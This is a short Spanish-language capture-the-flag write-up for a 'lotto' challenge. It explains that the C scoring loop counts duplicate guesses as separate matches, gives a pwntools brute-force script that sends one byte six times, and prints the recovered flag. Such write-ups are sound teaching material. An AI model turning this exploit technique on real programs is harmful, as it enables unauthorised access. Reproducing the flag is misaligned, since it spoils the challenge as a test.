# lotto

![lotto](https://github.com/user-attachments/assets/674b4bc5-9a2c-4eed-9d68-14543bfdc302)

El programa chequea erroneamente los numeros de la loteria, asi que basta con enviar el mismo byte 6 veces y que este entre 1 de los 6 generados aletoriamente:
```
	// calculate lotto score
	int match = 0, j = 0;
	for(i=0; i<6; i++){
		for(j=0; j<6; j++){
			if(lotto[i] == submit[j]){
				match++;
			}
		}
	}
```

Las probabilidades son 1/45, asi que hacemos fuerza bruta:
```python3
from pwn import *
io = process("./lotto")
while True:
    io.recv()
    io.sendline(b"1")
    io.recv()
    io.sendline(b"\x10"*6)
    io.recvline()
    r = io.recvline()
    if b"bad luck..." not in r:
        print(r.decode())
        break
```

**Dato curioso**: Perdi mi tiempo accidentalmente usando 6 valores que estaban fuera del rango [1-45] 

```
lotto@ubuntu:~$ python3 /tmp/so.py
[+] Starting local process './lotto': pid 408166
Sorry_mom_1_Forgot_to_check_duplicates
```

`Sorry_mom_1_Forgot_to_check_duplicates`
